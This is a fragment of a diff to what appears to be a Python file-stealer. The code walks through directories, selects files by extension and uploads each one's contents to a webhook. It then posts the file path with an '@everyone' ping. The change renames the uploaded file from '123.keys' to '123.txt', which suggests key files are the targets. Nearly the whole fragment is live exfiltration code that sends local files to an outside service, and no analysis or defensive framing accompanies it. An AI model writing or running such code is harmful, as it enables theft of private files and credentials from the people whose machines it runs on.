@@ -16,6 +16,6 @@ for root, dirs, files in os.walk(path): #loops through all files and subdirector
             if (fileType.lower() == ext.lower()): #checks if file matches a desired type
                 print( file)
                 with open(file, "rb") as f:
-                    webhook.add_file(file=f.read(), filename='123.keys')
+                    webhook.add_file(file=f.read(), filename='123.txt')
                     response = webhook.execute()
                     hook.send("@everyone  ~   " + file)
